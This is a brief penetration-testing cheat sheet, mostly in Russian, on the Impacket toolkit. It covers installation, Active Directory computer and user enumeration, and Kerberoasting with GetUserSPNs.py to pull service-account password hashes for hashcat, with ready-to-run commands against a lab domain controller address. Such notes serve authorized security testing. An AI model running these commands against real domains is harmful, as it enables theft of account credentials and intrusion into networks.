https://github.com/fortra/impacket
Пакет классов, написанных на Python для работы с различными библиотеками.
## Установка
Установка происходит через `pipx`
```bash
python3 -m pipx install impacket
```

If you want to play with the unreleased changes, download the development version from the [master branch](https://github.com/fortra/impacket/tree/master), extract the package, and execute the following command from the directory where Impacket has been unpacked:
```bash
python3 -m pipx install .
```

## Enumeration modules

**Компьютеры**
 `GetADComputers.py`
 ```bash
 GetADComputers.py -dc-ip 172.20.4.2 domain/user:password
 ```

**Учетные записи**
 `GetADUsers.py`
 ```bash
 GetADUsers.py -dc-ip 172.20.4.2 domain/user:password
 ```


## Kerberoasting

`GetUserSPNs.py` Модуль из пакета [[Impacket]]

Позволяет получать список сервисных учетных записей, билеты *TGS* и извлекать из них хэш паролей сервисных учетных записей.

**Запросить список *SPN***
```bash
GetUserSPNs.py -dc-ip 172.20.4.2 domain/user:password
```

**Запросить хэш из *TGS* билета для всех сервисных учетных записей**
```bash
GetUserSPNs.py -dc-ip 172.20.4.2 -request domain/user:password
```

**Запросить хэш из *TGS* билета по имени сервисной учетной записи**
```bash
GetUserSPNs.py -dc-ip 172.20.4.2 -request-user username domain/user:password
```

**Useful tips**
```bash
-ts # Print timestamp
-outputfile OUTPUT # Save hashes ouput in hashcat format
```

